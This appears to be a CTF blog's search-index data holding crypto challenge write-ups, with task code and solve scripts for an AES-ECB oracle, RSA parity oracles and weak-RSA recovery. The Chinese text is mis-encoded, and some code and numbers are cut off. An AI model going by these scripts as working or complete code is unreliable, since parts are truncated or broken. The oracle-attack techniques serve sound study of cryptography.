æ¯”å¦‚flagæ˜¯BaseCTF{0123456789}ï¼Œé•¿åº¦ä¸º19.ä¸€å¼€å§‹æœåŠ¡å™¨ç»™æˆ‘ä»¬å‘é€å¯†æ–‡ï¼ˆbase64è§£å¯†ä¹‹åï¼‰ä¸º32å­—èŠ‚ï¼Œä¸ºä¸¤ä¸ªAES-ECBåˆ†ç»„ã€‚æˆ‘ä»¬ç»™æœåŠ¡å™¨ä¾æ¬¡å‘é€1-16å­—èŠ‚çš„æ•°æ®ï¼Œå‘é€ä¸€ä¸ª1å­—èŠ‚æ—¶ï¼ŒæœåŠ¡å™¨åŠ å¯†20å­—èŠ‚ï¼Œæœ€åå¯†æ–‡è¿˜æ˜¯32å­—èŠ‚ï¼›å½“å‘é€14å­—èŠ‚æ—¶ï¼ŒæœåŠ¡å™¨åŠ å¯†33å­—èŠ‚ï¼Œæœ€åå¯†æ–‡ä¸º48å­—èŠ‚ï¼Œå‘ç”Ÿäº†å˜åŒ–ï¼Œåœ¨è¿™æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡ºflagé•¿åº¦ä¸º32-(14-1)=19ã€‚ exp from pwn import * from Crypto.Util.number import * import base64 p=remote() print(p.recvline()) print(p.recvline()) c=p.recvline()[:-1] c=base64.b64decode(c) length1=0 for i in range(16): p.recvline() # b\":\\n\" payload=b'a'*i p.sendline(payload) d=p.recvline()[:-1] d=base64.b64decode(d) if len(d)!=len(c): length1=i break length_flag=len(c)-length1 print(length_flag) # ä»å‰å¾€åçˆ†ç ´flag payload_length=len(c)+16 # å¤šä¸€ä¸ªåˆ†ç»„ä¿å®¹é”™ flag=b'' for i in range(payload_length-1,payload_length-1-length_flag,-1): p.recvline() # b\":\\n\" payload=b'a'*i p.sendline(payload) d=p.recvline()[:-1] d=base64.b64decode(d) for j in range(33,128): p.recvline() # b\":\\n\" payload1=b'a'*i+flag+chr(j).encode() p.sendline(payload1) e=p.recvline()[:-1] e=base64.b64decode(e) e=e[payload_length-16:payload_length] if e in d: flag+=chr(j).encode() break print(flag) ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:2","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"çŒœçŒœçœ‹ task from Crypto.Util.number import * import socketserver import numpy as np import random import ast import os flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): assert len(flag)==45 self.send(b\"hello.\") m=bytes_to_long(flag) m=bin(m)[2:] length=len(m) x=np.array([int(i) for i in m]) T=np.array([[random.getrandbits(1) for _ in range(length)] for __ in range(length)]) y=np.dot(x,T) self.send(str(list(y)).encode()) while True: user_input=ast.literal_eval(self.recv().strip().decode('utf-8')) if isinstance(user_input,list): try: mat=np.array(user_input) res=list(np.dot(mat,T)) self.send(str(res).encode()) except: self.send(b'wrong!!') else: self.send(b'wrong!') break self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() æ€è·¯ï¼šåˆ©ç”¨çŸ©é˜µä¹˜æ³•çš„æ€§è´¨ï¼Œä¸€ä¸ªçŸ©é˜µåªæœ‰ä¸€ä¸ª1ï¼Œå…¶ä»–éƒ½æ˜¯é›¶ï¼Œå½“ä»–æ˜¯å·¦ä¹˜æ—¶å°±å¯ä»¥å¾—åˆ°å³ä¹˜çŸ©é˜µçš„ä¸€è¡Œ exp import numpy as np from Crypto.Util.number import * from pwn import * p=remote() p.recvline() flag=eval(p.recvline()) length=45*8-1 T=[] for i in range(length): x=[0]*i+[1]+[0]*(length-1-i) p.sendline(str(x).encode()) T.append(eval(p.recvline())) T=np.array(T) t_ni=np.linalg.inv(T) m=np.dot(flag,t_ni) m=np.round(m) flag=\"\" for i in m: if i==1: flag+='1' else: flag+='0' print(long_to_bytes(int(flag,2))) p.interactive() ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:3","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"è€æ¶©æ‰¹äº† task from Crypto.Util.number import * import socketserver import os import uuid flag = os.getenv('GZCTF_FLAG').encode() class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 2048 data = b'' while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u003c BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b'\\n' self.request.sendall(msg) except: pass def recv(self): return self._recvall() def handle(self): p=getPrime(256) q=getPrime(256) n=p*q e=65537 d=inverse(e,(p-1)*(q-1)) text=b'BaseCTF{'+str(uuid.uuid4()).encode()+b'}' m1=bytes_to_long(text[:len(text)//2]) c1=pow(m1,e,n) m2=bytes_to_long(text[len(text)//2:]) c2=pow(m2,e,n) self.send(b'n = '+str(n).encode()) self.send(b'e = '+str(e).encode()) self.send(b'c1 = '+str(c1).encode()) self.send(b'c2 = '+str(c2).encode()) while True: select=self.recv().strip() if select==b'1': c=int(self.recv().decode().strip()) m=pow(c,d,n) res=m\u00261 elif select==b'2': c=int(self.recv().decode().strip()) m=pow(c,d,n) res=long_to_bytes(m,64)[0] elif select==b'3': user_text=self.recv().strip() if user_text==text: self.send(flag) break else: self.send(b'try again') break else : self.send(b'wrong') break self.send(str(res).encode()) self.send(b\"\\nConnection has been closed =.= \") self.request.close() class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 9999 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() æ€è·¯ï¼šä¸å¤ªä¼šï¼Œå†å­¦å­¦ exp from Crypto.Util.number import * import decimal from pwn import * from time import * rem=remote() rem.recvuntil(b'n = ') n=int(rem.recvline().decode().strip()) rem.recvuntil(b'e = ') e=int(rem.recvline().decode().strip()) rem.recvuntil(b'c1 = ') c1=int(rem.recvline().decode().strip()) rem.recvuntil(b'c2 = ') c2=int(rem.recvline().decode().strip()) def server_decode1(c): rem.sendline(b'1') sleep(0.01) rem.sendline(str(c).encode()) rec=rem.recvline().strip() return rec kbits = n.bit_length() decimal.getcontext().prec = kbits L = decimal.Decimal(0) R = decimal.Decimal(int(n)) for i in range(kbits): c1 = (c1 * pow(2, e, n)) % n recv = server_decode1(c1) if recv == b'1': L = (L + R) // 2 else: R = (L + R) // 2 flag1=long_to_bytes(int((R))) print(flag1) sleep(0.01) def server_decode2(c): rem.sendline(b'2') sleep(0.01) rem.sendline(str(c).encode()) rec=rem.recvline().strip() return rec k=1 while True: c22 = (c2 * pow(2, e*k, n)) % n res=server_decode2(c22) res=int(res) if res\u00261: break k=k+1 L=2**(k-1) R=2**k while True: if R-L==1: break x=(L+R)//2 c22 = (c2 * pow(x, e, n)) % n res=server_decode2(c22) res=int(res) if res: R=x else : L=x flag2=(2**(kbits-8)//L) print(long_to_bytes(flag2)) user_text=flag1[:-1]+b'-'+long_to_bytes(flag2) print(user_text) rem.sendline(b'3') sleep(0.01) rem.sendline(user_text) rem.interactive() ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:4","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"PDP task from Crypto.Util.number import * from gmpy2 import * import hashlib import hmac from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import * def KeyGen(): while True: pp=getPrime(512) p=2*pp+1 while not isPrime(p): pp=getPrime(512) p=2*pp+1 qq=getPrime(512) q=2*qq+1 while not isPrime(q): qq=getPrime(512) q=2*qq+1 if pp!=qq: break n=p*q phi=(p-1)*(q-1) e=getPrime(1024) d=invert(e,phi) v=getRandomNBitInteger(128) g=e**2%n return (n,g,e,d,v) def TagBlock(n,g,d,v): f=open(\"ABigFile\",'rb') F=f.read() f.close() b_size=64 # 64B block_count=len(F)//b_size + (0 if len(F)%b_size==0 else 1) W=[] tags=[] for i in range(block_count): Wi=str(v)+str(i) W.append(Wi) block=bytes_to_long(F[i*b_size:(i+1)*b_size]) my_md5=hashlib.md5() my_md5.update(Wi.encode()) tags.append(pow((int(my_md5.hexdigest(),16)*pow(g,block,n))%n,d,n)) return (W,tags) def GenProof(n,g): c=randint(400,500) k1=getRandomNBitInteger(256) k2=getRandomNBitInteger(160) s=getRandomNBitInteger(16) return (c,k1,k2,s,pow(g,s,n)) def gen_proof(n,tags,c,k1,k2,gs,judge=0): f=open(\"ABigFile\",'rb') F=f.read() f.close() b_size=64 # 64B if judge: listF=list(F) X=[] for i in range(len(F)//100): x=randint(0,len(F)-1) while listF[x]==0: x=randint(0,len(F)-1) X.append(x) listF[x]=0 F=b'' for i in listF: F+=long_to_bytes(i) block_count=len(F)//b_size + (0 if len(F)%b_size==0 else 1) T=1 temp=0 for j in range(c): my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB) i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size)) i=bytes_to_long(i)%block_count my_sha256=hashlib.sha256 my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256) my_hmac.update(long_to_bytes(j)) a=int(my_hmac.hexdigest(),16)%n T=(T*(pow(tags[i],a,n)))%n block=bytes_to_long(F[i*b_size:(i+1)*b_size])%n temp=temp+block*a temp=pow(gs,temp,n) my_sha1=hashlib.sha1() my_sha1.update(str(temp).encode()) rho=int(my_sha1.hexdigest(),16) return (T,rho) n,g,e,d,v=KeyGen() with open(\"./output/key.txt\",'w') as file: file.write(str(n)+'\\n') file.write(str(e)+'\\n') W,tags=TagBlock(n,g,d,v) with open(\"./output/W.txt\",\"w\") as file: for i in W: file.write(str(i)) file.write('\\n') c,k1,k2,s,gs=GenProof(n,g) with open(\"./output/chal.txt\",'w') as file: file.write(str(c)+'\\n') file.write(str(k1)+'\\n') file.write(str(k2)+'\\n') file.write(str(s)+'\\n') T,rho=gen_proof(n,tags,c,k1,k2,gs) with open(\"./output/result.txt\",'w') as file: file.write(str(T)+'\\n') flag_md5=hashlib.md5() flag_md5.update(str(rho).encode()) print(b'BaseCTF{'+flag_md5.hexdigest().encode()+b'}') æ€è·¯ï¼šnabyå¸ˆå‚…çš„æ¯•è®¾ï¼Œæ…¢æ…¢å­¦ exp from Crypto.Util.number import * from gmpy2 import * import hashlib import hmac from Crypto.Cipher import AES from Crypto.Util.Padding import pad from random import * def CheckProff(n,e,W,c,k1,k2,s,T): tau=pow(T,e,n) block_count=len(W) for j in range(c): my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB) i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size)) i=bytes_to_long(i)%block_count my_sha256=hashlib.sha256 my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256) my_hmac.update(long_to_bytes(j)) a=int(my_hmac.hexdigest(),16)%n Wi=str(W[i]) my_md5=hashlib.md5() my_md5.update(Wi.encode()) hw=pow(int(my_md5.hexdigest(),16),a,n) tau=(tau*invert(hw,n))%n tau=pow(tau,s,n) my_sha1=hashlib.sha1() my_sha1.update(str(tau).encode()) tau=int(my_sha1.hexdigest(),16) flag_md5=hashlib.md5() flag_md5.update(str(tau).encode()) print(b'BaseCTF{'+flag_md5.hexdigest().encode()+b'}') with open(\"./output/key.txt\",'r') as file: n=int(file.readline()) e=int(file.readline()) W=[] with open(\"./output/W.txt\",\"r\") as file: fl=file.readline() while fl: W.append(int(fl)) fl=file.readline() with open(\"./output/chal.txt\",'r') as file: c=int(file.readline()) k1=int(file.readline()) k2=int(file.readline()) s=int(file.readline()) T=234286400251524464112670458144913694525518333434039777508421611102466502545441606446799021254782625175811569624228349681696143431027926557585053651139957429856785510525021542033961575674601192776283321921860155347475439442726331189839563865","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:5:5","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"æ€»ç»“ æœ€åå‡ å‘¨åœ¨å†™uctfä»€ä¹ˆçš„ï¼Œå°±æ²¡æœ‰å†™å®Œï¼Œæœ€åä¸¤é¢˜æ˜¯çœŸçš„ä¸ä¼šï¼Œæ–°ç”Ÿèµ›ä½†æ˜¯å¾ˆç²¾å½©ï¼Œæ–°ç”Ÿä¹Ÿéƒ½å¾ˆå¼ºï¼Œæ„Ÿè§‰è‡ªå·±è¿˜æ˜¯ä¸å¤ŸåŠªåŠ›ï¼Œåªèƒ½ç»§ç»­åŠ æ²¹ã€‚ ","date":"2024-12-12","objectID":"/basectf2024-crypto-wp/:6:0","tags":["crypto"],"title":"Basectf2024_crypto","uri":"/basectf2024-crypto-wp/"},{"categories":["CTF"],"content":"å‰è¨€ æœ¬æ¥ä»¥ä¸ºç¤¾ä¼šç»„æ²¡æœ‰å¥–ï¼Œå°±åªå†™äº†cryptoå’Œä¸€éƒ¨åˆ†miscï¼Œç»“æœç»“æŸäº†åˆè¯´å‰åæœ‰å¥–ï¼Œå‘œå‘œå‘œ ","date":"2024-12-12","objectID":"/isctf2024_crypto/:1:0","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:0","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"æˆ‘å’Œå°è“é²¨çš„ç§˜å¯† from PIL import Image from Crypto.Util.number import bytes_to_long, long_to_bytes import numpy as np n = 29869349657224745144762606999 e = 65537 original_image_path = \"flag.jpg\" img = Image.open(original_image_path) img = img.convert(\"RGB\") img_array = np.array(img) h, w, _ = img_array.shape encrypted_array = np.zeros((h, w, 3), dtype=object) for i in range(h): for j in range(w): r, g, b = int(img_array[i, j, 0]), int(img_array[i, j, 1]), int(img_array[i, j, 2]) encrypted_array[i, j, 0] = pow(r, e, n) encrypted_array[i, j, 1] = pow(g, e, n) encrypted_array[i, j, 2] = pow(b, e, n) np.save(\"encrypted_image.npy\", encrypted_array) print(\"å›¾ç‰‡å·²åŠ å¯†å¹¶ä¿å­˜ä¸º encrypted_image.npy\") æ€è·¯ï¼šå°±æ˜¯å¾ˆç®€å•å›¾ç‰‡rsaï¼Œå¯ä»¥ç›´æ¥ï¼Œéå†ï¼Œnå¾ˆå°ï¼Œå¯ä»¥ç›´æ¥åˆ†è§£ exp from sympy import factorint from Crypto.Util.number import* import numpy as np from PIL import Image n = 29869349657224745144762606999 p=186431677583461 q=160216064374859 e=65537 phi = (p - 1) * (q - 1) d = inverse(e, phi) encrypted_array = np.load(\"encrypted_image.npy\", allow_pickle=True) h, w, _ = encrypted_array.shape decrypted_array = np.zeros((h, w, 3), dtype=np.uint8) for i in range(h): for j in range(w): decrypted_array[i, j, 0] = pow(encrypted_array[i, j, 0], d, n) decrypted_array[i, j, 1] = pow(encrypted_array[i, j, 1], d, n) decrypted_array[i, j, 2] = pow(encrypted_array[i, j, 2], d, n) decrypted_img = Image.fromarray(decrypted_array, 'RGB') decrypted_img.save(\"decrypted_flag.jpg\") print(\"Flag å·²è§£å¯†å¹¶ä¿å­˜ä¸º decrypted_flag.jpg\") ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:1","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"chacha20 task from Crypto.Cipher import ChaCha20_Poly1305 import os key = os.urandom(32) nonce = os.urandom(12) with open('flag.txt', 'rb') as f: plaintext = f.read() cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce) ct, tag = cipher.encrypt_and_digest(plaintext) print(f\"Encrypted Flag: {ct.hex()}\") print(f\"Tag: {tag.hex()}\") print(f\"Nonce: {nonce.hex()}\") with open('key.txt', 'w') as key_file: key_file.write(key.hex()) key?.txt 3=t#sMX3?9GHSPdi4i^gk!3*(cH8S8XT2y\u0026?Tv4!?AGG=R]ZDy/PVVa+DqiXAH*}DS\u0026Nn*a+@\u003cH,=!L output.txt Encrypted Flag: 20408b9fc498063ad53a4abb53633a6a15df0ddaf173012d620fa33001794dbb8c038920273464e13170e26d08923aeb Tag: 70ffcc508bf4519e7616f602123c307b Nonce: d8ebeedec812a6d71240cc50 æ€è·¯ï¼šchacha20åå‘è§£è¿‡å»å°±è¡Œäº†ï¼Œkeyæ˜¯ä¸ªbaseï¼Œè‡³äºå¤šå°‘è‡ªå·±è¯•å§ï¼Œå› ä¸ºæˆ‘ä¹Ÿæ˜¯ä¸€ä¸ªä¸€ä¸ªè¯•çš„ï¼ˆæ°”æ­»æˆ‘äº†ï¼‰ exp # python from Crypto.Cipher import ChaCha20_Poly1305 #keyæ˜¯base # æä¾›çš„å¯†é’¥ã€Nonceã€å¯†æ–‡å’Œæ ‡ç­¾ key_hex = '173974535637a5ef30a116b03d00bd2fe751951ca3eaa62daec2b8f5ca5b6135' nonce_hex = 'd8ebeedec812a6d71240cc50' ciphertext_hex = '20408b9fc498063ad53a4abb53633a6a15df0ddaf173012d620fa33001794dbb8c038920273464e13170e26d08923aeb' tag_hex = '70ffcc508bf4519e7616f602123c307b' # è½¬æ¢ä¸ºå­—èŠ‚ key = bytes.fromhex(key_hex) nonce = bytes.fromhex(nonce_hex) ciphertext = bytes.fromhex(ciphertext_hex) tag = bytes.fromhex(tag_hex) # åˆ›å»ºè§£å¯†å™¨ cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce) try: # è§£å¯†å¹¶éªŒè¯ plaintext = cipher.decrypt_and_verify(ciphertext, tag) print(\"Flag:\", plaintext.decode()) except Exception as e: print(\"è§£å¯†å¤±è´¥:\", e) ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:2","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"åŸºç¡€çš„æ•°å­¦ task Baseå’ŒCiphertext m = 5321153468370294351697008906248782883193902636120413346203705810525086437271585682015110123362488732193020749380395419994982400888011862076022065339666193 c = 7383779796712259466884236308066760158536557371789388054326630574611014773044467468610300619865230550443643660647968413988480055366698747395046400909922513 æ€è·¯ï¼šå†™çš„æ—¶å€™å·²ç»æœ‰hintäº†ï¼Œè¯´æ˜¯modæ˜¯2**512ï¼Œé‚£ä¹ˆç›´æ¥è§£å°±è¡Œäº† exp m = 5321153468370294351697008906248782883193902636120413346203705810525086437271585682015110123362488732193020749380395419994982400888011862076022065339666193 c = 7383779796712259466884236308066760158536557371789388054326630574611014773044467468610300619865230550443643660647968413988480055366698747395046400909922513 n=2**512 from sympy import discrete_log flag=discrete_log(n,c,m) from Crypto.Util.number import long_to_bytes print(long_to_bytes(flag)) ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:3","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"å°è“é²¨çš„å¯†ç  çœç•¥ï¼šå‹ç¼©åŒ…å¯†ç å°±æ˜¯å›¾ç‰‡çš„åå­—ï¼Œä¸å–œæ¬¢ ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:4","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"ezmath task import random import base64 from hashlib import md5 from secret import flag from libnum import s2n from Crypto.Cipher import AES INF = 0xff bigINF = 0xffffffff # ---------------------error------------------------------ def sumFunc(func): def wapper(*args,start = 1,end=INF): sums = 0 for i in trange(start, 0xffff * end): sums += function(*args,j/0xf) * (1/0xf) return sums return wapper def limitFunc(func): def wapper(*args, approch = bigINF, pos = \"+\"): o = 1/bigINF return function(args, eval(f\"{approch} {pos} {o}\")) return wapper # -------------------enderror----------------------------- def pad(data): data=data.encode('utf8') while len(data) % 16 !=0: data+=b'\\x00' return data def encode(key,m): mode=AES.MODE_ECB aes=AES.new(pad(key),mode) en_m=aes.encrypt(pad(m)) en_m=base64.encodebytes(en_m) en_m=en_m.decode('utf8') return en_m def enc(msg, key): random.seed(key) new_key = md5(str(random.getrandbits(256)).encode('utf-8')).hexdigest() return encode(new_key, msg) @sumFunc def gamma(x,t): data = pow(t,x-1) * pow(magicNumber,-t) return data @sumFunc def common(t): data = pow(magicNumber,-pow(t,2)) return data @limitFunc def getMagicNumber(t): data = pow(1+1/t,t) return data magicNumber = getMagicNumber() encKey1 = str(gamma(3/2))[2:6] encKey2 = str(common())[2:6] assert encKey1 == encKey2 key = int(str(gamma(5/2))[2:]) print(enc(flag, key)) # n2SQK64JMsXstCtZurBiz81pMr3ZmgMjhuyL67hssm3shqJGYGfS/mWubINeE5HZ æ€è·¯ï¼šä»£ç é‡Œé¢æ˜¯è£…é¥°å™¨ï¼Œå…ˆæŠŠä»£ç ä¿®å¤ä¸€ä¸‹ï¼Œè™½ç„¶ä¿®ä¸ä¿®æ— æ‰€è°“ï¼Œè®¡ç®—gamma(5/2)çš„ç»“æœå°±è¡Œï¼Œkeyå°±æ˜¯å°æ•°éƒ¨åˆ†ï¼Œç›´æ¥æ±‚å°±è¡Œäº† exp import random import base64 from hashlib import md5 from Crypto.Cipher import AES def pad(data): if isinstance(data, str): data = data.encode('utf8') while len(data) % 16 != 0: data += b'\\x00' return data random.seed(key) rand_bits = random.getrandbits(256) new_key = md5(str(rand_bits).encode('utf-8')).hexdigest() return new_key def decode(key, en_m): new_key = compute_new_key(key) print(f\"New Key: {new_key}\") aes = AES.new(pad(new_key), AES.MODE_ECB) en_m_bytes = base64.decodebytes(en_m.encode('utf8')) de_m = aes.decrypt(en_m_bytes) try: return de_m.rstrip(b'\\x00').decode('utf8') except UnicodeDecodeError: print(\"è§£å¯†åçš„å­—èŠ‚æ— æ³•ä»¥UTF-8è§£ç ã€‚\") return de_m.rstrip(b'\\x00') encrypted_flag = \"n2SQK64JMsXstCtZurBiz81pMr3ZmgMjhuyL67hssm3shqJGYGfS/mWubINeE5HZ\" key_str = \"1.329340388179137\" key = int(key_str.split('.')[1]) print(f\"Computed Key: {key}\") flag = decode(key, encrypted_flag) print(f\"Flag = {flag}\") ","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:5","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"fermat task import libnum import gmpy2 from Crypto.Util.number import * flag=b'ISCTF{********}' m=bytes_to_long(flag) p=libnum.generate_prime(1024) q=libnum.generate_prime(1024) n=p*q e=0x10001 c=pow(m,e,n) d=inverse(e,(p-1)*(q-1)) leak = (d+(pow(p,q,n)+pow(q,p,n)))%n print(\"c=\", c) print(\"n=\", n) print(\"leak=\", leak) \"\"\" c= 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997 n= 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247 leak= 9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881 \"\"\" æ€è·¯ï¼šå¾ˆç»å…¸çš„é¢˜ç›®ï¼Œé£äºŒè¥¿ä½¬å¥½åƒè®²è¿‡ï¼Œå¯ä»¥ç›´æ¥å»çœ‹ï¼Œæ‰€ä»¥å’±ä»¬å°±ä¸å†™äº†ï¼ˆæ‡’ exp import gmpy2 from Crypto.Util.number import long_to_bytes, inverse import libnum # ç»™å®šçš„å€¼ c = 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997 n = 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247 leak = 919200208652802541236105305892266946903118819314914363507479863385511223048947925474032403226269031581365042827091107912191386929089357489775299049142958264049954216561625456639656401673415732326563144607974421645871969085352696935993022504299300640484335535654048729689694943196954136714484198515323109514036106925675359355019942099346178681407427017125711741084879661493192618281140465561966269070035198675366150243829923642899","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:6","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"è“é²¨çš„RSA task from secret import flag import gmpy2 import decimal from Crypto.Util.number import * def gethint(h,p): decimal.getcontext().prec = 1024 H = decimal.Decimal(int(h)) P = decimal.Decimal(int(p)) leak = decimal.Decimal((8*H*P - 1) / (16*P*P)) return leak p = getPrime(512) q = getPrime(512) f = getPrime(512) g = getPrime(128) h = gmpy2.invert(f, p) * g % p n = f*q e = 65537 m = bytes_to_long(flag) c = pow(m,e,n) print('c =', c) print('hint =', gethint(h,p)) print('n =',n) #c = 587245179027322480379581200283415189810421958968516831191660631552695197401940961725169763339428980298128692606951200581483431566182271569207988054537414289564013883171160614196522169980339024564884190765084419167938640701193928669 #hint = 0.2427542737153618793334900104191212626446625872340179613972610728976081994921862517310186626304527115125924716035632505287111236596234811779375148657365336957626454491865164520834975233144235103885081268955448330597818844340656652982593545877449810282619387305007246499089258519062093814083383071737897364213169497762760797899310673216754376885295598952272100016962368762532805864796748393317534908268379601445004775495237901072144236328105526403608646831124542336002540011176406194984370372589752234640498423911217119220030242197564695880261480071310815379681250975672935544404797155655708441222387631967447088319826137200280810029390387418159394276760100487636516708987579464183208860911063948902432948269805493252899815187044807603000344378890835564906163242023600624338694473573763088471321731611077227112205396909637906507673367598721218000123789690455125909411309668615810240938664264212370815385282488986625554704015828254539339719586211726300858711328516487805251366293457402531199532556110786048074755505680210260049 #n = 839799159583571337450826982895478997157381520448790705455708438948150905361244823725400304016136863419723271227616684280477524669207590477657886623628732394537008838314015048569652202355464477680540884654473950183135276735347866051 æ€è·¯ï¼špå’Œhç›´æ¥è¿åˆ†æ•°å±•å¼€ï¼Œbasectfæœ‰ä¸€ä¸ªä¸ä¹‹ç±»ä¼¼çš„é¢˜ï¼Œä½†æ˜¯æ³¨æ„åˆ°æ˜¯ $$8HP/16PP $$æ‰€ä»¥å±•å¼€æ—¶å…¶å®æ˜¯leak*2,åé¢æ˜¯ä¸ªåŸºç¡€çš„æ ¼ï¼Œå¯ä»¥çœ‹detexä½¬çš„åšå®¢ exp hint = 0.2427542737153618793334900104191212626446625872340179613972610728976081994921862517310186626304527115125924716035632505287111236596234811779375148657365336957626454491865164520834975233144235103885081268955448330597818844340656652982593545877449810282619387305007246499089258519062093814083383071737897364213169497762760797899310673216754376885295598952272100016962368762532805864796748393317534908268379601445004775495237901072144236328105526403608646831124542336002540011176406194984370372589752234640498423911217119220030242197564695880261480071310815379681250975672935544404797155655708441222387631967447088319826137200280810029390387418159394276760100487636516708987579464183208860911063948902432948269805493252899815187044807603000344378890835564906163242023600624338694473573763088471321731611077227112205396909637906507673367598721218000123789690455125909411309668615810240938664264212370815385282488986625554704015828254539339719586211726300858711328516487805251366293457402531199532556110786048074755505680210260049 hint=hint*2 cf = continued_fraction(hint) for i in range(1000000000000): k = cf.numerator(i) x = cf.denominator(i) if is_prime(x) and x.bit_length() == 512: print(k,x) p,q = k,x break h=5644635742819829990750561229762805499221246439546826634192809053443196388050776487556004854931490257361050491682744164242094809598515347830480716371931526 p=11626233508536225614198811594320851252696454462193005033285647766940577053402735947923143276545500298338019376937355197687508293952240619015634703176724083 c=587245179027322480379581200283415189810421958968516831191660631552695197401940961725169763339428980298128692606951200581483431566182271569207988054537414289564013883171160614196522169980339024564884190765084419167938640701193928669 n=83979915958357133745082698289547899715738152044879070545570843894815090536124482372540030401613686341972327122761668428047752466920759047765788662","date":"2024-12-12","objectID":"/isctf2024_crypto/:2:7","tags":["crypto"],"title":"isctf2024_crypto","uri":"/isctf2024_crypto/"},{"categories":["CTF"],"content":"å°è“é²¨çš„æ–¹ç¨‹ task from Cryptodome.Util.number import * from random import * from gmpy2 import * import uuid 